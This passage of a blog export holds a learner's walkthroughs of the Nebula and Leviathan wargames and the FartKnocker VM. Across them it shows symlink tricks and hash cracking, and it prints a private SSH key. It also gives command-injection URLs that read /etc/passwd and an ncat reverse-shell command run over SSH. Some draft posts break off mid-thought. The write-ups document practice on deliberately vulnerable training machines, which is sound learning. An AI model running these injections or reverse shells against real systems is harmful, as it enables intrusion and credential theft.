    // What to do if there is only one cli-argument.
      printf(&quot;%s [file to read]\n&quot;, argv[0]);
      exit(EXIT_FAILURE);
    // EXIT_FAILURE comes from some std lib.
    // This seems to be mostly harmless.
  }

  if(strstr(argv[1], &quot;token&quot;) != NULL) {
    // So this occurs only if the variable name is token.
    // strstr evaluates if the first argument contains anything from the second.
    // So we can't ever read any file that contains the word token in it.
      printf(&quot;You may not access '%s'\n&quot;, argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  // Here we initialize and declare the fd variable.
  // It appears to open the file, in a read-only manner, and then save it in
  // the variable fd.

  if(fd == -1) {
    // This statement fires if a file doesn't exist, I think.
      err(EXIT_FAILURE, &quot;Unable to open %s&quot;, argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));

// So here we take the input file, and read it. The buffer-size is here.


  if(rc == -1) {
    // If the file somehow doesn't exists it throws this error.
      err(EXIT_FAILURE, &quot;Unable to read fd %d&quot;, fd);
  }

  write(1, buf, rc);
  // Here we write to standard out (the 1 indicates it).
}

[/code]
I started trying to encode the file name and some other stuff, that didn't work. Then it hit me. I can just create a link.

[code]
level04@nebula:/tmp/04$ ln -s /home/flag04/token ./test
level04@nebula:/tmp/04$ ls
test  test.sh
level04@nebula:/tmp/04$ /home/flag04/flag04 ./test
06508b5e-8909-4f38-b630-fdb148a848a2
[/code]
Wohoo, it worked!

<h2>Level 5</h2>
About
Check the flag05 home directory. You are looking for weak directory permissions
To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.

So I just read the files.
[code]
level05@nebula:/home/flag05/.backup$ tar -Oxf backup-19072011.tgz .ssh/id_rsa.pub

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLAINcUvucamDG5PzLxljLOJ/nrkzot7EQJ9pEWXoQJC0/ZWm+ezhFHQd5UWlkwPZ2FBDvqxdcrgmmHT/FVGBjK0XWGwIkuJ50nf5pbJExi2SC9kNMMMP2VgY/OxvcUuoGhzEISlgkuu4hJjVh3NeliAgERVzxKCrxSvW48wcAxg4v5vceBra6lY7u8FT2D3VIsHogzKN77Z2g7k2qY82A0vOqw82e/h6IXLjpYwBur0rm0/u3GFB1HFhnAxuGcn4IsnQSBdQCB2S+eOUZ4PmiQ/rUSHuVvMeLCzrxKR+UG9zDwoCwwXpNJehAQJGCiL3JzBNnLjFaylSqKP6xj7cR user@wwwbugs
[/code]

[code]
level05@nebula:/home/flag05/.backup$ tar -Oxf backup-19072011.tgz .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAywCDXFL7nGpgxuT8y8ZYyzif565M6LexECfaRFl6ECQtP2Vp
vns4RR0HeVFpZMD2dhQQ76sXXK4Jph0/xVRgYytF1hsCJLiedJ3+aWyRMYtkgvZD
TDDD9lYGPzsb3FLqBocxCEpYJLruISY1YdzXpYgIBEVc8Sgq8Ur1uPMHAMYOL+b3
Hga2upWO7vBU9g91SLB6IMyje+2doO5NqmPNgNLzqsPNnv4eiFy46WMAbq9K5tP7
txhQdRxYZwMbhnJ+CLJ0EgXUAgdkvnjlGeD5okP61Eh7lbzHiws68SkflBvcw8KA
sMF6TSXoQECRgoi9ycwTZy4xWspUqij+sY+3EQIDAQABAoIBAAGir2w+/ufzs3Pm
xGKf5nc8rY0gSl5VnIeUyp1iWylmITcxifiO5ZUo9rZzgXXeWB37a2eC6V1Fya4c
7jaYx24FGzruXMYO9rfZzgLrbQAJL3YepcwnWGzTpJk90Kulv1zuGecHMk6ZcvGx
bRysutAKmIXwSR9oQ3BOOkyTKKtI6YeKSnUNU1KVO1t//ps2wFcfXRFb17prpokx
5clWwfUYRLBQlB4XjBIJ3tswpyC0PNOFfzoF+VeUlN9XZFrL0JWHX1F9DDOFJYL5
bXw7zwhjEvZ0/qOvZSJiH4lkbmANsBeMNY/JOGV6T7dWthKBGehCnupeADZVaSeo
Qlysa0ECgYEA6x4FwgpeqNtNGeCcSAUtoviTYMD5LfMEpY8t9eGdRpzw1CDlmG9x
k1LgzE3eA0qlJYx5NNqYEefIPVLdmSuSGS/5KqHeB8Ph7+WqLmguwIIIrfRJoPaD
ON2XqLU6YzAEazTrXnqALjOvP3qdN57xK0zoBAfYlkXJRgMYE1S23YsCgYEA3QhF
Fl11csPc2Yyz/7+9MG9JnOckYvuir+bf3fj/HEuIC9ylwXd4GfSLAW02Sg8DlfRh
M7MxCW9OEWtKgUtHe3fGc6/6X1yF7QfeAYZm8UX/fo6PxuX++mvfPxM4i6vRjgzB
Qy8WisqTK9nLZO+hEdPoVqalz0iUsvu2umz0CVMCgYAsNoUWrCSI1FR3XUmGMZMX
Zm8wbpltDpn9GCOobTjKIpEXEuiZ9bsB3T/wq2Poco0DtprEWabnFxMMlRyexRbA
LclJPw8lnqxKFIIgH+9KvCktrRZ7cl/SvbjbPNkx9cGe92Cbb6XTCl0WLtSJtRXc
8qVevKr59z2WMNbCK9gHaQKBgQDRaQNjpBohKFX2OytSU8uftuBMamV77iJ9e0SA
Hmc83IbBjkPwnwrHtHt6V4lG8yCXktgAznXYFX8mW7tT8gmAfcMkWgbhEFzGbFy2
nyqqzoG42sJ3U/KWOVtifAhns9qvNYBo8ZTu2+xBcHAWaj31EQqgBfU0BPT0+ixu
RcmThwKBgAi0ej7ylHhtwODQGghRmDpxEx9deJ0jilM2EnqIecJj5jnPW8BKDgV4
Dc1QljBeCQ1r30DGYmOIazbhm+orm4df6HWPayRhNBlkmulqTs5GHvLMPjcKMB0k
0Xna7QOtBAnzoHpLcrfvBdfRNE1eC87YkPUhmm5hBgG0+TeMmWgr
-----END RSA PRIVATE KEY-----
[/code]
Then I saved it down and sshed into the flag-user.
[code]
level05@nebula:/tmp/05/.ssh$ ssh -i id_rsa flag05@192.168.1.105
[/code]

<h2>Level 06</h2>
Old unix-passord-config. Okay, I know that passowrd were stored in /etc/passwd before they where stored in shadow.

[code]
cat /etc/passwd
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
[/code]
Looks like it can be done with john the ripper.

So I just copy-pasted the hash into a file and then ran john on it like this

[code]
 $ john level06Hash
Using default input encoding: UTF-8
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 AVX-16])
Press 'q' or Ctrl-C to abort, almost any other key for status
hello            (?)
1g 0:00:00:00 DONE 2/3 (2016-05-08 11:29) 2.777g/s 355.5p/s 355.5c/s 355.5C/s 123456..marley
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
[/code]
So that was easy.

<h2>Level 07</h2>
This level was a bit tricky. It is about teching command injection.
So these articles were really useful.
<a href="http://www.golemtechnologies.com/articles/shell-injection">link1</a>
<a href="https://www.owasp.org/index.php/Testing_for_Command_Injection_%28OTG-INPVAL-013%29">link2</a>

So we have a few files.
.lesshst - that the history from the program less

[code]
level07@nebula:~$ cat .viminfo
# File marks:
'0  1  0  ~/index.cgi?Host=|getflag|
'1  1  0  ~/index.cgi

# Jumplist (newest first):
-'  1  0  ~/index.cgi?Host=|getflag|
-'  1  0  ~/index.cgi
-'  1  0  ~/index.cgi

# History of marks within files (newest to oldest):

&gt; ~/index.cgi?Host=|getflag|
	&quot;	1	0
[/code]

And here is the cgi-code.
[code lang="perl"]
  #!/usr/bin/perl

  use CGI qw{param};

  print &quot;Content-type: text/html\n\n&quot;;

  sub ping {
    $host = $_[0];

    print(&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;);

    @output = `ping -c 3 $host 2&gt;&amp;1`;
    foreach $line (@output) { print &quot;$line&quot;; }

    print(&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;);

  }

  # check if Host set. if not, display normal page, etc

  ping(param(&quot;Host&quot;));
[/code]
I had never really looked at perl-code before. But it kind of made some sense I guess. 

The config-file specified a port
[code]
# Specifies an alternate port number to listen on.
port=7007
dir=/home/flag07
[/code]
So I found that port, and started curling to se what I could run. After a lot of trial and error
I found a way to do it:

curl "http://nebula.dev:7007/index.cgi?Host=www.google.com|getflag"
I also learned that you have to encode spaces correct otherwise the sever will get all confused. So if you wanna run any command with spaces you do it like this:
http://nebula.dev:7007/index.cgi?Host=%3Bcat%20/etc/passwd

I had to encode the semicolon. That was the key to it!

<h2>Level 08</h2>
This is for sure my favorite level so far. I really enjoy analyzing packets.
So first I moved the pcap-file to my computer with netcat, and then I opened it up in wireshark.

There was no http-requests. So I guess this traffic was not on the web.

There are two machines talking:
59.233.235.218 - 39247
59.233.235.223 - 12121

So looking at the packets we can tell that the machines are in Bejing, both of them. The source and destination corrdinates show that they are in the same place.
After looking up the ports I found this:
http://www.speedguide.net/port.php?port=12121
[code]
12121 	tcp 	trojans 	Backdoor.Balkart (2004.09.02) - a backdoor trojan horse that can act as a HTTP proxy or FTP server

Port is also IANA registered for NuPaper Session Service 	SG
12121 	tcp,udp 	nupaper-ss 	NuPaper Session Service 	IANA
12121 	tcp 	threat 	Balkart
[/code]
Even though it doesn't really say in the challenge what kind of traffic this is, I like to image that it was someone who had infected the 12121 computer with the Balkart-trojan. <a href="https://www.symantec.com/security_response/writeup.jsp?docid=2004-090212-3607-99">This one</a>. But it doesn't really matter, it is irrelevant for this challenge.

So I went over the packets and found some interesting ones.
[code]
 #'
 0000   ff fa 20 00 33 38 34 30 30 2c 33 38 34 30 30 ff  .. .38400,38400.
 0010   f0 ff fa 23 00 53 6f 64 61 43 61 6e 3a 30 ff f0  ...#.SodaCan:0..
 0020   ff fa 27 00 00 44 49 53 50 4c 41 59 01 53 6f 64  ..'..DISPLAY.Sod
 0030   61 43 61 6e 3a 30 ff f0 ff fa 18 00 78 74 65 72  aCan:0......xter
 0040   6d ff f0                                         m..

  38400,38400#SodaCan:0'DISPLAYSodaCan:0xterm
  &quot;&quot;bb	B
1!
[/code]
But I couldn't piece it all together. So after analyzing every single poacker separtely, I realized that the packages come and go in different
order, an order that doesn't make sense. So I learned something reaally useful. Right-click on a package and then
click on: follow, and then tcp-stream. This way we can see the full interaction, all packets combined to one.
[code]
..%..%..&amp;..... ..#..'..$..&amp;..... ..#..'..$.. .....#.....'........... .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm..........&quot;........!........&quot;..&quot;.....b........b....	B.
..............................1.......!..&quot;......&quot;......!...........&quot;........&quot;..&quot;.............	..
.....................
Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)

..wwwbugs login: l.le.ev.ve.el.l8.8
level8
..
Password: backdoor...00Rm8.ate

Password: backd00Rmate
.
..
Login incorrect
wwwbugs login:
[/code]
So the password looked pretty strange. And it didn't work. But after I checked the tcp-stram in hex it became clear that the dot's in the password was f7 in hex. f7 represents DEL. So every f7 was the user deleting letters. I guess he/she has problem remembering his/her own password.
So this:
Password: backdoor...00Rm8.ate
Became this:
Password: backd00Rmate

<h2>Level 09</h2>
I will continue some other day.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1235</wp:post_id>
		<wp:post_date>2016-05-08 22:38:50</wp:post_date>
		<wp:post_date_gmt>2016-05-08 22:38:50</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>nebula-walkthrough</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="ctf"><![CDATA[CTF]]></category>
		<category domain="post_tag" nicename="pen-testing"><![CDATA[pen-testing]]></category>
		<category domain="post_tag" nicename="security"><![CDATA[security]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<category domain="post_tag" nicename="wargames"><![CDATA[wargames]]></category>
		<wp:postmeta>
			<wp:meta_key>_oembed_fe63bda592030c7a229f4fdb1ad240bc</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_71b7afba573ebaf52e40ae0c9b81c772</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_4bca61f1ffd8af631aedf56520479cfb</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_f6aa965b54029085ef4684b811119da6</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_0aa3f08d22b103c287dc4570df1b095c</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_832b130e0cdbfdf4f2720bc5df93dca8</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_b7f700094cdb1e1a411061d5312edce3</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_9d88dfbdd83f4e99a8a107deeda0ff15</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[22612935831]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_7bf3ad534887ade3e3266eba597c3e4c</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_f2569912434de301119819960214d4f0</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_ed38e8fc87e324de03fd42d4e620cac3</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Leviathan Walkthrough</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/?p=1391</link>
		<pubDate>Mon, 30 Nov -0001 00:00:00 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1391</guid>
		<description></description>
		<content:encoded><![CDATA[Okay, so I am a bit all over the place now. 


<h2>Leviathan 00</h2>
There is a file called bookmarks.html

So yeah I bascially just grepped for a password in it and it gave me the password.

[code]
leviathan0@melinda:~/.backup$ grep  password bookmarks.html 
&amp;amp;amp;lt;DT&amp;amp;amp;gt;&amp;amp;amp;lt;A HREF=&amp;amp;amp;quot;http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m&amp;amp;amp;quot; ADD_DATE=&amp;amp;amp;quot;1155384634&amp;amp;amp;quot; LAST_CHARSET=&amp;amp;amp;quot;ISO-8859-1&amp;amp;amp;quot; ID=&amp;amp;amp;quot;rdf:#$2wIU71&amp;amp;amp;quot;&amp;amp;amp;gt;password to leviathan1&amp;amp;amp;lt;/A&amp;amp;amp;gt;

[/code]

<h2>Level 01</h2>
Here we have a binary called check. In order to solve this challenge we are going to have to do some basic reverse engineering.

First lets check what type of file it is.

[code]
leviathan1@melinda:~$ file check 
check: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0d17ae20f672ebc7d440bb4562277561cc60f2d0, not stripped
[/code]

So we know it is a setuid ELF 32-bit executable. And it is not stripped. 

So let's see if we can see anything in the strings.

[code]
leviathan1@melinda:~$ strings check 
/lib/ld-linux.so.2
Eb'ua
libc.so.6
_IO_stdin_used
puts
__stack_chk_fail
printf
getchar
system
strcmp
__libc_start_main
__gmon_start__
GLIBC_2.4
GLIBC_2.0
PTRh`
QVh-
D$,1
D$%secrf
D$)et
D$ love
T$,e3
[^_]
password: 
/bin/sh
Wrong password, Good Bye ...
;*2$&amp;amp;amp;quot;
[/code]
This part looks suspicious: D$,1
D$%secrf
D$)et
D$ love
T$,e3

Let's see what we can get by using ltrace.
Ltrace basically traces the calls that are done in the program. 

[code]
leviathan1@melinda:~$ ltrace ./check 
__libc_start_main(0x804852d, 1, 0xffffd694, 0x80485f0 &amp;amp;amp;lt;unfinished ...&amp;amp;amp;gt;
printf(&amp;amp;amp;quot;password: &amp;amp;amp;quot;)                                                                     = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password: pelle
)                                             = 112
getchar(0x8048680, 47, 0x804a000, 0x8048642)                                             = 101
getchar(0x8048680, 47, 0x804a000, 0x8048642)                                             = 108
strcmp(&amp;amp;amp;quot;pel&amp;amp;amp;quot;, &amp;amp;amp;quot;sex&amp;amp;amp;quot;)                                                                     = -1
puts(&amp;amp;amp;quot;Wrong password, Good Bye ...&amp;amp;amp;quot;Wrong password, Good Bye ...
)                                                     = 29
+++ exited (status 0) +++
leviathan1@melinda:~$ 
[/code]

Okay, so three functions are invoked here. printf, strcmp and puts. prinf just prints out the text. strcmp compares out input-string with the string sex. And puts outputs some more text.
So here we can see that the password is sex.

So we enter the password and we are now leviathan2. Now we can look for files belonging to leviathan2.

[code]
find / -user leviathan2 2&amp;amp;amp;gt;/dev/null
/etc/leviathan_pass/leviathan2
[/code]

So there we have our password.
ougahZi8Ta

<h2>Level 02</h2>

[code]
leviathan2@melinda:~$ ls -la
total 28
drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
drwxr-xr-x 167 root       root       4096 Jul  9  2015 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r-sr-x---   1 leviathan3 leviathan2 7498 Nov 14  2014 printfile
[/code]

So we have a file that is owned by leviathan3, but leviathan2 is in the same group. And thus have the ability to execute it.


ss

<h2>Level 03 </h2>

strings level3
tells us the following functons are used. I think.

puts
__stack_chk_fail
stdin
printf
fgets
system
strcmp


[You've got shell]!
/bin/sh
bzzzzzzzzap. WRONG
Enter the password&gt; 
;*2$"
secret

[code]
strcmp(&quot;h0no33&quot;, &quot;kakaka&quot;)                                                                                                     = -1
printf(&quot;Enter the password&gt; &quot;)                                                                                                 = 20
fgets(Enter the password&gt; pelle
&quot;pelle\n&quot;, 256, 0xf7fcbc20)                                                                                              = 0xffffd47c
strcmp(&quot;pelle\n&quot;, &quot;snlprintf\n&quot;)                                                                                               = -1
puts(&quot;bzzzzzzzzap. WRONG&quot;bzzzzzzzzap. WRONG
)
[/code]
Okay so it looks like it is comparding the sinput string to the string snlprintf
So, we have two strings that are compared.
/root/OverTheWire-games/games/leviathan/leviathan3

vuH0coox6m

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1391</wp:post_id>
		<wp:post_date>2016-05-23 18:20:06</wp:post_date>
		<wp:post_date_gmt>0000-00-00 00:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name></wp:post_name>
		<wp:status>draft</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
	</item>
	<item>
		<title>Baiscs of assembly</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/?p=1426</link>
		<pubDate>Mon, 30 Nov -0001 00:00:00 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1426</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1426</wp:post_id>
		<wp:post_date>2016-05-10 11:20:00</wp:post_date>
		<wp:post_date_gmt>0000-00-00 00:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name></wp:post_name>
		<wp:status>draft</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
	</item>
	<item>
		<title>Walkthrough FartKnocker</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/05/11/walkthrough-fartknocker/</link>
		<pubDate>Wed, 11 May 2016 22:57:50 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1430</guid>
		<description></description>
		<content:encoded><![CDATA[Another VM is done. Here is the writeup. And here is the <a href="https://www.vulnhub.com/entry/tophatsec-fartknocker,115/">link to the VM on vulnhub</a>.

<h2>Recon</h2>

[code]
$ netdiscover -r 192.168.1.1/24 
192.168.1.103   08:00:27:3d:0d:c8      1      60  Cadmus Computer System
[/code]

The Nmap-scan.
[code]
Not shown: 65534 closed ports
Reason: 65534 resets
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:3D:0D:C8 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
TCP/IP fingerprint:
OS:SCAN(V=7.12%E=4%D=5/9%OT=80%CT=1%CU=42070%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
OS:=57311E63%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=I%II=I%
OS:TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=
OS:7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)
[/code]

So port 80 is the only one open. An interesting little detail here is that it says that it found "65534 closed ports", and then it says: Reason: 65534 resets. I think that means that the server has responded with RST/ACK. Something I learned in this challenge. But we will get to that.

On port 80 we find a file named pcap1.pcap. So I open it up in wireshark. 
To the experienced packet-inspector I guess that it is quite obvious what is going on in this packet-capture. But I had never heard about port-knocking. So I got lost on a detour for quite some time. I was inspecting the ICMP-packets. All of those packets ended with "!"#$%&amp;'()*+,-./01234567". Something that I though was suspicious. So I started googeling about hacks that use ICMP and found a lot.

It turns out that you can use the ICMP-protocol to hide, or tunnel, other services. So I thought that someone had injected a Loki-rootkit into the server, and what I was observing was the communication between the hacker (with ip ...102) and the victim-server. And that I was supposed to enter through the same exploit. But after going through the ICMP-packets in detail I realized that they really were just pings, and nothing else. They never contained more data than the default "!"#$%&amp;'()*+,-./01234567", which I learned could be used to fingerprint the server. This data meant that the server probably was a linux. So after discarding all the ICMP packets I started to look into the TCP-packets more closely. And after some creative googeling about ports I learned about port-knocking.

<h3>Port knocking</h3>
So I downloaded knockd, that is used to implement port-knocking. And I got it to work by running this command:
[code]
knock 192.168.1.103 7000 8000 9000
nc 192.168.1.103 8888
[/code]
 
This also worked:

[code]
for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 192.168.1.103; done
nc 192.168.1.103 8888
[/code]

And this:

[code]
nc 192.168.1.103 7000
nc 192.168.1.103 8000
nc 192.168.1.103 9000
nc 192.168.1.103 8888
[/code]

Anyways, it lead me to this address: /burgerworld. I downloaded the pcap-file and continued. I went through each and every packet in detail to understand how they all worked. But I am not going to bore you with that. So I right-clicked on a TCP-packet and then clicked on follow tcp-stream. And it showed me a nice ascii-image of beavis (or butthead, can't remember who's who). And the text: eins drei drei sieben. So I google-translated the text, and it was what I though, the classic number 1337. So after trying every single possible combination of portknocking I finally figured out that it was supposed to be 1 3 3 7. And then nc to port 1337. There I found: /iamcornholio/ which gave me this text:

"huhhuhhh...Hey Beavis...Im all about uhhh...huhuh...that base huhhuhhh...

 T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK"
So the base-comment made me think that it was probably base64-encoded. And it was.

It translated into: Open up SSH: 8888 9999 7777 6666
So I knocked the port and got access to port 22.

[code]
$ ssh root@192.168.1.103                                                   1 ↵
The authenticity of host '192.168.1.103 (192.168.1.103)' can't be established.
ECDSA key fingerprint is SHA256:uSdkKIWXcJl0j0P5Y+cAzjD9CJOFQ/NxtG8kz8ptzFE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.103' (ECDSA) to the list of known hosts.
############################################
# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
# USERNAME: butthead                       #
# PASSWORD: nachosrule                     #
############################################
[/code]

So I logged in as butthead, but was immedietly thrown out.

From doing some challenges on overthewire I learned that you can execute commands with SSH without getting an actual shell.

But first I downloaded sshpass to be able to make the process a bit easier, and then:
[code]
sshpass -p nachosrule ssh butthead@192.168.1.103 ls
nachos
[/code]

So then I used nc to get a permanent shell.
[code]
$ sshpass -p nachosrule ssh butthead@192.168.1.103 &quot;ncat -e /bin/sh 192.168.1.106 1234&quot;
[/code]

<h2>Escalation</h2>
So I got a shell, and it was time to escalate.
I ran the linEnum.sh script and waded through the info. And checked for vulns on sudo. But nothing really of interest. Some meaningless tuff in /tmp, some scripts in beavis. Then I found pcap3 and pcap4. That I studied thoroughly. In pcap4 I saw that there was some ssh-keychanges going on, and some encrypted data-transfer. But after some googeling I concluded that there is not really any way I could possibly break that. SSH with Diffie-hellman seems pretty waterproof.

In the end I ended up running the Ubuntu 14 priv-exploit that I have used on some other VM:s. This one: https://www.exploit-db.com/exploits/37292/. That exploit really is incredible/incredibly dangerous.

So I became root and got the SECRETZ in /root. 

<h2>Conclusion</h2>

Packet-analysis really was awesome. A lot of fun and interesting stuff. I feel like I have really started to get a grip of how packets are structured, and started to get to know Wireshark a lot more. So the main takeaways from this VM really was learning packet-analysis and about port-knocking.

Thanks to <a href="https://www.top-hat-sec.com/r4v3ns-blog/fartknocker-vm-challenge">top-hat-sec</a> for another great VM!

After reading other writeups I learned about https://digi.ninja/projects/cewl.php. Which I am really excited about trying out. Gonna try it soon.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1430</wp:post_id>
		<wp:post_date>2016-05-11 22:57:50</wp:post_date>
		<wp:post_date_gmt>2016-05-11 22:57:50</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>walkthrough-fartknocker</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="ctf"><![CDATA[CTF]]></category>
		<category domain="post_tag" nicename="pen-testing"><![CDATA[pen-testing]]></category>
		<category domain="post_tag" nicename="security"><![CDATA[security]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<category domain="post_tag" nicename="vulnhub"><![CDATA[vulnhub]]></category>
		<wp:postmeta>
			<wp:meta_key>_oembed_1563c73acd9e0504baf061f20c23b0c4</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[22719287049]]></wp:meta_value>
